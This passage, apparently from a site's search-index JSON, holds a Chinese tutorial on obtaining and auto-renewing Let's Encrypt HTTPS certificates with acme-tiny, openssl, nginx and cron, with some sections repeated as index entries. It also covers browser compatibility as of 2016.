/home/xxx/www/challenges/oJbvpIhkwkBGBAQUklWJXyC8VbWAdQqlgpwUJkgC1Vg, but couldn't download http://www.yoursite.com/.well-known/acme-challenge/oJbvpIhkwkBGBAQUklWJXyC8VbWAdQqlgpwUJkgC1Vg \u8fd9\u662f\u56e0\u4e3a\u4f60\u7684\u57df\u540d\u5f88\u53ef\u80fd\u5728\u56fd\u5916\u65e0\u6cd5\u89e3\u6790\uff0c\u53ef\u4ee5\u627e\u53f0\u56fd\u5916 VPS \u9a8c\u8bc1\u4e0b\u3002\u6211\u7684\u57df\u540d\u6700\u8fd1\u4ece DNSPod \u6362\u5230\u4e86\u963f\u91cc\u4e91\u89e3\u6790\uff0c\u6700\u540e\u53c8\u6362\u5230\u4e86 CloudXNS\uff0c\u5c31\u662f\u56e0\u4e3a\u6700\u8fd1\u524d\u4e24\u5bb6\u5728\u56fd\u5916\u90fd\u5f88\u4e0d\u7a33\u5b9a\u3002\u5982\u679c\u4f60\u4e5f\u9047\u5230\u4e86\u7c7b\u4f3c\u60c5\u51b5\uff0c\u53ef\u4ee5\u6682\u65f6\u4f7f\u7528\u56fd\u5916\u7684 DNS \u89e3\u6790\u670d\u52a1\u5546\uff0c\u4f8b\u5982 dns.he.net \u3002\u5982\u679c\u8fd8\u662f\u641e\u4e0d\u5b9a\uff0c\u4e5f\u53ef\u4ee5\u8bd5\u8bd5\u300c Neilpang/le \u300d\u8fd9\u4e2a\u5de5\u5177\u7684 DNS Mode\u3002 \u641e\u5b9a\u7f51\u7ad9\u8bc1\u4e66\u540e\uff0c\u8fd8\u8981\u4e0b\u8f7d Let's Encrypt \u7684\u4e2d\u95f4\u8bc1\u4e66\u3002\u6211\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u8bb2\u8fc7\uff0c\u914d\u7f6e HTTPS \u8bc1\u4e66\u65f6\u65e2\u4e0d\u8981\u6f0f\u6389\u4e2d\u95f4\u8bc1\u4e66\uff0c\u4e5f\u4e0d\u8981\u5305\u542b\u6839\u8bc1\u4e66\u3002\u5728 Nginx \u914d\u7f6e\u4e2d\uff0c\u9700\u8981\u628a\u4e2d\u95f4\u8bc1\u4e66\u548c\u7f51\u7ad9\u8bc1\u4e66\u5408\u5728\u4e00\u8d77\uff1a wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem cat signed.crt intermediate.pem > chained.pem \u4e3a\u4e86\u540e\u7eed\u80fd\u987a\u5229\u542f\u7528 OCSP Stapling \uff0c\u6211\u4eec\u518d\u628a\u6839\u8bc1\u4e66\u548c\u4e2d\u95f4\u8bc1\u4e66\u5408\u5728\u4e00\u8d77\uff1a wget -O - https://letsencrypt.org/certs/isrgrootx1.pem > root.pem cat intermediate.pem root.pem > full_chained.pem \u6700\u7ec8\uff0c\u4fee\u6539 Nginx \u4e2d\u6709\u5173\u8bc1\u4e66\u7684\u914d\u7f6e\u5e76 reload \u670d\u52a1\u5373\u53ef\uff1a ssl_certificate ~/www/ssl/chained.pem; ssl_certificate_key ~/www/ssl/domain.key; Nginx \u4e2d\u4e0e HTTPS \u6709\u5173\u7684\u914d\u7f6e\u9879\u5f88\u591a\uff0c\u8fd9\u91cc\u4e0d\u4e00\u4e00\u5217\u4e3e\u4e86\u3002\u5982\u6709\u9700\u8981\uff0c \u8bf7\u53c2\u8003\u672c\u7ad9\u914d\u7f6e \u3002 \u914d\u7f6e\u81ea\u52a8\u66f4\u65b0 Let's Encrypt \u7b7e\u53d1\u7684\u8bc1\u4e66\u53ea\u6709 90 \u5929\u6709\u6548\u671f\uff0c\u63a8\u8350\u4f7f\u7528\u811a\u672c\u5b9a\u671f\u66f4\u65b0\u3002\u4f8b\u5982\u6211\u5c31\u521b\u5efa\u4e86\u4e00\u4e2a renew_cert.sh \u5e76\u901a\u8fc7 chmod a+x renew_cert.sh \u8d4b\u4e88\u6267\u884c\u6743\u9650\u3002\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\uff1a #!/bin/bash cd /home/xxx/www/ssl/ python acme_tiny.py --account-key account.key --csr domain.csr --acme-dir /home/xxx/www/challenges/ > signed.crt || exit wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem cat signed.crt intermediate.pem > chained.pem service nginx reload crontab \u4e2d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u6bd4\u8f83\u4fdd\u9669\uff0c crontab -e \u52a0\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a 0 0 1 * * /home/xxx/shell/renew_cert.sh >/dev/null 2>&1 \u8fd9\u6837\u4ee5\u540e\u8bc1\u4e66\u6bcf\u4e2a\u6708\u90fd\u4f1a\u81ea\u52a8\u66f4\u65b0\uff0c\u4e00\u52b3\u6c38\u9038\u3002\u5b9e\u9645\u4e0a\uff0cLet's Encrypt \u5b98\u65b9\u5c06\u8bc1\u4e66\u6709\u6548\u671f\u5b9a\u4e3a 90 \u5929\u4e00\u65b9\u9762\u662f\u4e3a\u4e86\u66f4\u5b89\u5168\uff0c\u66f4\u91cd\u8981\u7684\u662f\u9f13\u52b1\u7528\u6237\u91c7\u7528\u81ea\u52a8\u5316\u90e8\u7f72\u65b9\u6848\u3002 \u51e0\u4e2a\u95ee\u9898 Let's Encrypt \u8bc1\u4e66\u7684\u517c\u5bb9\u6027\uff0c\u6240\u6709\u64cd\u4f5c\u7cfb\u7edf\u3001\u6d4f\u89c8\u5668\u9ed8\u8ba4\u662f\u5426\u90fd\u80fd\u8bc6\u522b\u662f\u5927\u5bb6\u6700\u5173\u5fc3\u7684\u95ee\u9898\u3002\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e Let's Encrypt \u4e0e IdenTrust \u7684 DST Root CA \u505a\u4e86\u4ea4\u53c9\u8ba4\u8bc1\uff0c\u517c\u5bb9\u6027\u8fd8\u662f\u4e0d\u9519\u7684\uff0c\u76ee\u524d\u6211\u53ea\u662f\u53d1\u73b0\u5728 Android 2 \u548c Windows XP \u4e0b\u6709\u95ee\u9898\uff08Firefox \u7684\u8bc1\u4e66\u90a3\u4e00\u5957\u662f\u81ea\u5df1\u5b9e\u73b0\u7684\uff0c\u4e0d\u4f9d\u8d56\u4e8e\u7cfb\u7edf\uff0cXP \u4e0b\u53ea\u6709 Firefox \u4fe1\u4efb Let's Encrypt \u8bc1\u4e66\uff09\uff0c\u5176\u5b83\u73af\u5883\u90fd\u6b63\u5e38\u3002 \uff08Windows XP \u4e0d\u4fe1\u4efb Let's Encrypt \u7684\u4e2d\u95f4\u8bc1\u4e66\uff09 \u66f4\u65b0\uff1a\u6839\u636e Let's Encrypt \u5b98\u65b9\u8bf4\u660e\uff0cWindows XP \u4e0b\u7684\u95ee\u9898\u5f88\u5feb\u5c31\u4f1a\u89e3\u51b3\uff1a A bug in Windows XP causes parsing of our current cross-signature from IdenTrust to fail. We will be correcting this by getting new cross-signatures from IdenTrust which work on Windows XP. \u6ce8\uff1a\u5df2\u4e8e 2016 \u5e74 3 \u6708 26 \u65e5\u89e3\u51b3\u3002 \u53e6\u5916\u4e00\u4e2a\u95ee\u9898\u6709\u5173 ECC \u8bc1\u4e66\uff0c\u5b98\u7f51\u8868\u793a\u8ba1\u5212\u5c06\u5728 2016 \u5e74\u63d0\u4f9b\u5bf9 ECC \u8bc1\u4e66\u7684\u652f\u6301\uff1a Right now all of our root and intermediate keys use RSA. We're planning to generate ECC keys and make an ECC option available to subscribers in 2016. via \u6ce8\uff1aLet's Encrypt \u5df2\u4e8e 2016 \u5e74 2 \u6708 11 \u65e5\u5f00\u59cb\u652f\u6301\u7b7e\u53d1 ECC \u8bc1\u4e66\u3002 Let's Encrypt \u5b98\u65b9\u7684\u65b0\u7279\u6027\u9884\u544a\u53ef\u4ee5\u5728 \u8fd9\u4e2a\u9875\u9762\u67e5\u770b \u3002 \u6211\u4e2a\u4eba\u5efa\u8bae\uff1a\u5bf9\u4e8e\u4e2a\u4eba\u7528\u6237\u6765\u8bf4\uff0c\u5982\u679c\u975e\u5e38\u5728\u610f\u8bc1\u4e66\u517c\u5bb9\u6027\uff0c\u53ef\u4ee5\u8d2d\u4e70 RapidSSL Standard \u6216\u8005 Comodo Positive SSL \u8fd9\u4e24\u79cd\u8bc1\u4e66\u3002\u5176\u4e2d RapidSSL \u8bc1\u4e66\u4e00\u5171\u624d\u4e09\u7ea7\uff0c\u6bd4\u8f83\u5c0f\uff1bComodo Positive \u6709\u56db\u7ea7\uff0c\u4f46\u53ef\u4ee5\u7533\u8bf7 ECC \u8bc1\u4e66\uff1b\u4e8c\u8005\u90fd\u6709\u7740\u4e0d\u9519\u7684\u517c\u5bb9\u6027\uff0c\u4e5f\u975e\u5e38\u5ec9\u4ef7\uff08\u4e00\u5e74\u4e0d\u5230 10$\uff09\u3002\u5f53\u7136\uff0c\u5982\u679c\u4e0d\u7528\u8003\u8651 Windows XP \u7528\u6237\uff0c\u90a3\u4e48\u5f3a\u70c8\u63a8\u8350 Let's Encrypt\uff01 \u66f4\u65b0\uff1aLet's Encrypt \u5df2\u7ecf\u652f\u6301 Windows XP \u548c\u7b7e\u53d1 ECC \u8bc1\u4e66\uff0c\u5bf9\u4e8e\u4e2a\u4eba\u7528\u6237\u6765\u8bf4\uff0c\u76ee\u524d Let's Encrypt \u65e0\u7591\u662f\u6700\u597d\u7684\u9009\u62e9\u3002 \u672c\u6587\u5148\u5199\u5230\u8fd9\u91cc\uff0c\u5982\u679c\u4f60\u5728\u7533\u8bf7 Let's Encrypt \u8bc1\u4e66\u7684\u8fc7\u7a0b\u4e2d\u9047\u5230\u95ee\u9898\uff0c\u53ef\u4ee5\u7ed9\u6211\u7559\u8a00\uff0c\u4e5f\u6b22\u8fce\u4ea4\u6d41\u5404\u79cd\u5fc3\u5f97\uff01 \u672c\u6587\u94fe\u63a5\uff1a https://imququ.com/post/letsencrypt-certificate.html \uff0c \u53c2\u4e0e\u8bc4\u8bba \u00bb --EOF-- \u539f\u6587\u94fe\u63a5\uff1a https://imququ.com/post/letsencrypt-certificate.html","title":"Let's Encrypt\uff0c\u514d\u8d39\u597d\u7528\u7684 HTTPS \u8bc1\u4e66"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#lets-encrypt-https","text":"============================ \u5f88\u65e9\u4e4b\u524d\u6211\u5c31\u5728\u5173\u6ce8 Let's Encrypt \u8fd9\u4e2a\u514d\u8d39\u3001\u81ea\u52a8\u5316\u3001\u5f00\u653e\u7684\u8bc1\u4e66\u7b7e\u53d1\u670d\u52a1\u3002\u5b83\u7531 ISRG\uff08Internet Security Research Group\uff0c\u4e92\u8054\u7f51\u5b89\u5168\u7814\u7a76\u5c0f\u7ec4\uff09\u63d0\u4f9b\u670d\u52a1\uff0c\u800c ISRG \u662f\u6765\u81ea\u4e8e\u7f8e\u56fd\u52a0\u5229\u798f\u5c3c\u4e9a\u5dde\u7684\u4e00\u4e2a\u516c\u76ca\u7ec4\u7ec7\u3002Let's Encrypt \u5f97\u5230\u4e86 Mozilla\u3001Cisco\u3001Akamai\u3001Electronic Frontier Foundation \u548c Chrome \u7b49\u4f17\u591a\u516c\u53f8\u548c\u673a\u6784\u7684\u652f\u6301\uff0c\u53d1\u5c55\u5341\u5206\u8fc5\u731b\u3002 \u7533\u8bf7 Let's Encrypt \u8bc1\u4e66\u4e0d\u4f46\u514d\u8d39\uff0c\u8fd8\u975e\u5e38\u7b80\u5355\uff0c\u867d\u7136\u6bcf\u6b21\u53ea\u6709 90 \u5929\u7684\u6709\u6548\u671f\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u5b9a\u671f\u66f4\u65b0\uff0c\u914d\u597d\u4e4b\u540e\u4e00\u52b3\u6c38\u9038\u3002\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u89c2\u671b\uff0c\u6211\u4e5f\u6b63\u5f0f\u542f\u7528 Let's Encrypt \u8bc1\u4e66\u4e86\uff0c\u672c\u6587\u8bb0\u5f55\u672c\u7ad9\u7533\u8bf7\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u3002 \u6211\u6ca1\u6709\u4f7f\u7528 Let's Encrypt \u5b98\u7f51\u63d0\u4f9b\u7684\u5de5\u5177\u6765\u7533\u8bf7\u8bc1\u4e66\uff0c\u800c\u662f\u7528\u4e86 acme-tiny \u8fd9\u4e2a\u66f4\u4e3a\u5c0f\u5de7\u7684\u5f00\u6e90\u5de5\u5177\u3002\u4ee5\u4e0b\u5185\u5bb9\u57fa\u672c\u6309\u7167 acme-tiny \u7684\u8bf4\u660e\u6587\u6863\u5199\u7684\uff0c\u7701\u7565\u4e86\u4e00\u4e9b\u6211\u4e0d\u9700\u8981\u7684\u6b65\u9aa4\u3002 ACME \u5168\u79f0\u662f Automated Certificate Management Environment\uff0c\u76f4\u8bd1\u8fc7\u6765\u662f\u81ea\u52a8\u5316\u8bc1\u4e66\u7ba1\u7406\u73af\u5883\u7684\u610f\u601d\uff0cLet's Encrypt \u7684\u8bc1\u4e66\u7b7e\u53d1\u8fc7\u7a0b\u4f7f\u7528\u7684\u5c31\u662f ACME \u534f\u8bae\u3002\u6709\u5173 ACME \u534f\u8bae\u7684\u66f4\u591a\u8d44\u6599\u53ef\u4ee5\u5728 \u8fd9\u4e2a\u4ed3\u5e93 \u627e\u5230\u3002","title":"Let's Encrypt\uff0c\u514d\u8d39\u597d\u7528\u7684 HTTPS \u8bc1\u4e66"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_1","text":"\u9996\u5148\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55\uff0c\u4f8b\u5982 ssl \uff0c\u7528\u6765\u5b58\u653e\u5404\u79cd\u4e34\u65f6\u6587\u4ef6\u548c\u6700\u540e\u7684\u8bc1\u4e66\u6587\u4ef6\u3002\u8fdb\u5165\u8fd9\u4e2a\u76ee\u5f55\uff0c\u521b\u5efa\u4e00\u4e2a RSA \u79c1\u94a5\u7528\u4e8e Let's Encrypt \u8bc6\u522b\u4f60\u7684\u8eab\u4efd\uff1a openssl genrsa 4096 > account.key","title":"\u521b\u5efa\u5e10\u53f7"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#csr","text":"\u63a5\u7740\u5c31\u53ef\u4ee5\u751f\u6210 CSR\uff08Certificate Signing Request\uff0c\u8bc1\u4e66\u7b7e\u540d\u8bf7\u6c42\uff09\u6587\u4ef6\u4e86\u3002\u5728\u8fd9\u4e4b\u524d\uff0c\u8fd8\u9700\u8981\u521b\u5efa\u57df\u540d\u79c1\u94a5\uff08\u4e00\u5b9a\u4e0d\u8981\u4f7f\u7528\u4e0a\u9762\u7684\u8d26\u6237\u79c1\u94a5\uff09\uff0c\u6839\u636e\u8bc1\u4e66\u4e0d\u540c\u7c7b\u578b\uff0c\u57df\u540d\u79c1\u94a5\u4e5f\u53ef\u4ee5\u9009\u62e9 RSA \u548c ECC \u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u3002\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u4e8c\u9009\u4e00\u3002 1\uff09\u521b\u5efa RSA \u79c1\u94a5\uff08\u517c\u5bb9\u6027\u597d\uff09\uff1a openssl genrsa 4096 > domain.key 2\uff09\u521b\u5efa ECC \u79c1\u94a5\uff08\u90e8\u5206\u8001\u65e7\u64cd\u4f5c\u7cfb\u7edf\u3001\u6d4f\u89c8\u5668\u4e0d\u652f\u6301\u3002\u4f18\u70b9\u662f\u8bc1\u4e66\u4f53\u79ef\u5c0f\uff09\uff1a #secp256r1 openssl ecparam -genkey -name secp256r1 | openssl ec -out domain.key #secp384r1 openssl ecparam -genkey -name secp384r1 | openssl ec -out domain.key \u6709\u5173 ECC \u8bc1\u4e66\u7684\u66f4\u591a\u4ecb\u7ecd\uff0c\u8bf7 \u70b9\u51fb\u8fd9\u91cc \u3002 \u6709\u4e86\u79c1\u94a5\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u751f\u6210 CSR \u6587\u4ef6\u4e86\u3002\u5728 CSR \u4e2d\u63a8\u8350\u81f3\u5c11\u628a\u57df\u540d\u5e26 www \u548c\u4e0d\u5e26 www \u7684\u4e24\u79cd\u60c5\u51b5\u90fd\u52a0\u8fdb\u53bb\uff0c\u5176\u5b83\u5b50\u57df\u53ef\u4ee5\u6839\u636e\u9700\u8981\u6dfb\u52a0\uff08\u76ee\u524d\u4e00\u5f20\u8bc1\u4e66\u6700\u591a\u53ef\u4ee5\u5305\u542b 100 \u4e2a\u57df\u540d\uff09\uff1a openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config <(cat /etc/ssl/openssl.cnf <(printf \"[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com\")) > domain.csr \u6267\u884c\u8fd9\u4e00\u6b65\u65f6\uff0c\u5982\u679c\u63d0\u793a\u627e\u4e0d\u5230 /etc/ssl/openssl.cnf \u6587\u4ef6\uff0c\u8bf7\u770b\u770b /usr/local/openssl/ssl/openssl.cnf \u662f\u5426\u5b58\u5728\u3002\u5982\u679c\u8fd8\u662f\u4e0d\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4ea4\u4e92\u65b9\u5f0f\u521b\u5efa CSR\uff08\u9700\u8981\u6ce8\u610f Common Name \u5fc5\u987b\u4e3a\u4f60\u7684\u57df\u540d\uff09\uff1a openssl req -new -sha256 -key domain.key -out domain.csr","title":"\u521b\u5efa CSR \u6587\u4ef6"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_2","text":"\u6211\u4eec\u77e5\u9053\uff0cCA \u5728\u7b7e\u53d1 DV\uff08Domain Validation\uff09\u8bc1\u4e66\u65f6\uff0c\u9700\u8981\u9a8c\u8bc1\u57df\u540d\u6240\u6709\u6743\u3002\u4f20\u7edf CA \u7684\u9a8c\u8bc1\u65b9\u5f0f\u4e00\u822c\u662f\u5f80 admin@yoursite.com \u53d1\u9a8c\u8bc1\u90ae\u4ef6\uff0c\u800c Let's Encrypt \u662f\u5728\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u751f\u6210\u4e00\u4e2a\u968f\u673a\u9a8c\u8bc1\u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u521b\u5efa CSR \u65f6\u6307\u5b9a\u7684\u57df\u540d\u8bbf\u95ee\uff0c\u5982\u679c\u53ef\u4ee5\u8bbf\u95ee\u5219\u8868\u660e\u4f60\u5bf9\u8fd9\u4e2a\u57df\u540d\u6709\u63a7\u5236\u6743\u3002 \u9996\u5148\u521b\u5efa\u7528\u4e8e\u5b58\u653e\u9a8c\u8bc1\u6587\u4ef6\u7684\u76ee\u5f55\uff0c\u4f8b\u5982\uff1a mkdir ~/www/challenges/ \u7136\u540e\u914d\u7f6e\u4e00\u4e2a HTTP \u670d\u52a1\uff0c\u4ee5 Nginx \u4e3a\u4f8b\uff1a server { server_name www.yoursite.com yoursite.com; location ^~ /.well-known/acme-challenge/ { alias /home/xxx/www/challenges/; try_files $uri =404; } location / { rewrite ^/(.*)$ https://yoursite.com/$1 permanent; } } \u4ee5\u4e0a\u914d\u7f6e\u4f18\u5148\u67e5\u627e ~/www/challenges/ \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u5982\u679c\u627e\u4e0d\u5230\u5c31\u91cd\u5b9a\u5411\u5230 HTTPS \u5730\u5740\u3002\u8fd9\u4e2a\u9a8c\u8bc1\u670d\u52a1\u4ee5\u540e\u66f4\u65b0\u8bc1\u4e66\u8fd8\u8981\u7528\u5230\uff0c\u5efa\u8bae\u4e00\u76f4\u4fdd\u7559\u3002","title":"\u914d\u7f6e\u9a8c\u8bc1\u670d\u52a1"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_3","text":"\u5148\u628a acme-tiny \u811a\u672c\u4fdd\u5b58\u5230\u4e4b\u524d\u7684 ssl \u76ee\u5f55\uff1a wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py \u6307\u5b9a\u8d26\u6237\u79c1\u94a5\u3001CSR \u4ee5\u53ca\u9a8c\u8bc1\u76ee\u5f55\uff0c\u6267\u884c\u811a\u672c\uff1a python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir ~/www/challenges/ > ./signed.crt \u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u5f53\u524d\u76ee\u5f55\u4e0b\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a signed.crt \uff0c\u8fd9\u5c31\u662f\u7533\u8bf7\u597d\u7684\u8bc1\u4e66\u6587\u4ef6\u3002 \u5982\u679c\u4f60\u628a\u57df\u540d DNS \u89e3\u6790\u653e\u5728\u56fd\u5185\uff0c\u8fd9\u4e00\u6b65\u5f88\u53ef\u80fd\u4f1a\u9047\u5230\u7c7b\u4f3c\u8fd9\u6837\u7684\u9519\u8bef\uff1a ValueError: Wrote file to /home/xxx/www/challenges/oJbvpIhkwkBGBAQUklWJXyC8VbWAdQqlgpwUJkgC1Vg, but couldn't download http://www.yoursite.com/.well-known/acme-challenge/oJbvpIhkwkBGBAQUklWJXyC8VbWAdQqlgpwUJkgC1Vg \u8fd9\u662f\u56e0\u4e3a\u4f60\u7684\u57df\u540d\u5f88\u53ef\u80fd\u5728\u56fd\u5916\u65e0\u6cd5\u89e3\u6790\uff0c\u53ef\u4ee5\u627e\u53f0\u56fd\u5916 VPS \u9a8c\u8bc1\u4e0b\u3002\u6211\u7684\u57df\u540d\u6700\u8fd1\u4ece DNSPod \u6362\u5230\u4e86\u963f\u91cc\u4e91\u89e3\u6790\uff0c\u6700\u540e\u53c8\u6362\u5230\u4e86 CloudXNS\uff0c\u5c31\u662f\u56e0\u4e3a\u6700\u8fd1\u524d\u4e24\u5bb6\u5728\u56fd\u5916\u90fd\u5f88\u4e0d\u7a33\u5b9a\u3002\u5982\u679c\u4f60\u4e5f\u9047\u5230\u4e86\u7c7b\u4f3c\u60c5\u51b5\uff0c\u53ef\u4ee5\u6682\u65f6\u4f7f\u7528\u56fd\u5916\u7684 DNS \u89e3\u6790\u670d\u52a1\u5546\uff0c\u4f8b\u5982 dns.he.net \u3002\u5982\u679c\u8fd8\u662f\u641e\u4e0d\u5b9a\uff0c\u4e5f\u53ef\u4ee5\u8bd5\u8bd5\u300c Neilpang/le \u300d\u8fd9\u4e2a\u5de5\u5177\u7684 DNS Mode\u3002 \u641e\u5b9a\u7f51\u7ad9\u8bc1\u4e66\u540e\uff0c\u8fd8\u8981\u4e0b\u8f7d Let's Encrypt \u7684\u4e2d\u95f4\u8bc1\u4e66\u3002\u6211\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u8bb2\u8fc7\uff0c\u914d\u7f6e HTTPS \u8bc1\u4e66\u65f6\u65e2\u4e0d\u8981\u6f0f\u6389\u4e2d\u95f4\u8bc1\u4e66\uff0c\u4e5f\u4e0d\u8981\u5305\u542b\u6839\u8bc1\u4e66\u3002\u5728 Nginx \u914d\u7f6e\u4e2d\uff0c\u9700\u8981\u628a\u4e2d\u95f4\u8bc1\u4e66\u548c\u7f51\u7ad9\u8bc1\u4e66\u5408\u5728\u4e00\u8d77\uff1a wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem cat signed.crt intermediate.pem > chained.pem \u4e3a\u4e86\u540e\u7eed\u80fd\u987a\u5229\u542f\u7528 OCSP Stapling \uff0c\u6211\u4eec\u518d\u628a\u6839\u8bc1\u4e66\u548c\u4e2d\u95f4\u8bc1\u4e66\u5408\u5728\u4e00\u8d77\uff1a wget -O - https://letsencrypt.org/certs/isrgrootx1.pem > root.pem cat intermediate.pem root.pem > full_chained.pem \u6700\u7ec8\uff0c\u4fee\u6539 Nginx \u4e2d\u6709\u5173\u8bc1\u4e66\u7684\u914d\u7f6e\u5e76 reload \u670d\u52a1\u5373\u53ef\uff1a ssl_certificate ~/www/ssl/chained.pem; ssl_certificate_key ~/www/ssl/domain.key; Nginx \u4e2d\u4e0e HTTPS \u6709\u5173\u7684\u914d\u7f6e\u9879\u5f88\u591a\uff0c\u8fd9\u91cc\u4e0d\u4e00\u4e00\u5217\u4e3e\u4e86\u3002\u5982\u6709\u9700\u8981\uff0c \u8bf7\u53c2\u8003\u672c\u7ad9\u914d\u7f6e \u3002","title":"\u83b7\u53d6\u7f51\u7ad9\u8bc1\u4e66"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_4","text":"Let's Encrypt \u7b7e\u53d1\u7684\u8bc1\u4e66\u53ea\u6709 90 \u5929\u6709\u6548\u671f\uff0c\u63a8\u8350\u4f7f\u7528\u811a\u672c\u5b9a\u671f\u66f4\u65b0\u3002\u4f8b\u5982\u6211\u5c31\u521b\u5efa\u4e86\u4e00\u4e2a renew_cert.sh \u5e76\u901a\u8fc7 chmod a+x renew_cert.sh \u8d4b\u4e88\u6267\u884c\u6743\u9650\u3002\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\uff1a #!/bin/bash cd /home/xxx/www/ssl/ python acme_tiny.py --account-key account.key --csr domain.csr --acme-dir /home/xxx/www/challenges/ > signed.crt || exit wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem cat signed.crt intermediate.pem > chained.pem service nginx reload crontab \u4e2d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u6bd4\u8f83\u4fdd\u9669\uff0c crontab -e \u52a0\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a 0 0 1 * * /home/xxx/shell/renew_cert.sh >/dev/null 2>&1 \u8fd9\u6837\u4ee5\u540e\u8bc1\u4e66\u6bcf\u4e2a\u6708\u90fd\u4f1a\u81ea\u52a8\u66f4\u65b0\uff0c\u4e00\u52b3\u6c38\u9038\u3002\u5b9e\u9645\u4e0a\uff0cLet's Encrypt \u5b98\u65b9\u5c06\u8bc1\u4e66\u6709\u6548\u671f\u5b9a\u4e3a 90 \u5929\u4e00\u65b9\u9762\u662f\u4e3a\u4e86\u66f4\u5b89\u5168\uff0c\u66f4\u91cd\u8981\u7684\u662f\u9f13\u52b1\u7528\u6237\u91c7\u7528\u81ea\u52a8\u5316\u90e8\u7f72\u65b9\u6848\u3002","title":"\u914d\u7f6e\u81ea\u52a8\u66f4\u65b0"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_5","text":"Let's Encrypt \u8bc1\u4e66\u7684\u517c\u5bb9\u6027\uff0c\u6240\u6709\u64cd\u4f5c\u7cfb\u7edf\u3001\u6d4f\u89c8\u5668\u9ed8\u8ba4\u662f\u5426\u90fd\u80fd\u8bc6\u522b\u662f\u5927\u5bb6\u6700\u5173\u5fc3\u7684\u95ee\u9898\u3002\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e Let's Encrypt \u4e0e IdenTrust \u7684 DST Root CA \u505a\u4e86\u4ea4\u53c9\u8ba4\u8bc1\uff0c\u517c\u5bb9\u6027\u8fd8\u662f\u4e0d\u9519\u7684\uff0c\u76ee\u524d\u6211\u53ea\u662f\u53d1\u73b0\u5728 Android 2 \u548c Windows XP \u4e0b\u6709\u95ee\u9898\uff08Firefox \u7684\u8bc1\u4e66\u90a3\u4e00\u5957\u662f\u81ea\u5df1\u5b9e\u73b0\u7684\uff0c\u4e0d\u4f9d\u8d56\u4e8e\u7cfb\u7edf\uff0cXP \u4e0b\u53ea\u6709 Firefox \u4fe1\u4efb Let's Encrypt \u8bc1\u4e66\uff09\uff0c\u5176\u5b83\u73af\u5883\u90fd\u6b63\u5e38\u3002 \uff08Windows XP \u4e0d\u4fe1\u4efb Let's Encrypt \u7684\u4e2d\u95f4\u8bc1\u4e66\uff09 \u66f4\u65b0\uff1a\u6839\u636e Let's Encrypt \u5b98\u65b9\u8bf4\u660e\uff0cWindows XP \u4e0b\u7684\u95ee\u9898\u5f88\u5feb\u5c31\u4f1a\u89e3\u51b3\uff1a A bug in Windows XP causes parsing of our current cross-signature from IdenTrust to fail. We will be correcting this by getting new cross-signatures from IdenTrust which work on Windows XP. \u6ce8\uff1a\u5df2\u4e8e 2016 \u5e74 3 \u6708 26 \u65e5\u89e3\u51b3\u3002 \u53e6\u5916\u4e00\u4e2a\u95ee\u9898\u6709\u5173 ECC \u8bc1\u4e66\uff0c\u5b98\u7f51\u8868\u793a\u8ba1\u5212\u5c06\u5728 2016 \u5e74\u63d0\u4f9b\u5bf9 ECC \u8bc1\u4e66\u7684\u652f\u6301\uff1a Right now all of our root and intermediate keys use RSA. We're planning to generate ECC keys and make an ECC option available to subscribers in 2016. via \u6ce8\uff1aLet's Encrypt \u5df2\u4e8e 2016 \u5e74 2 \u6708 11 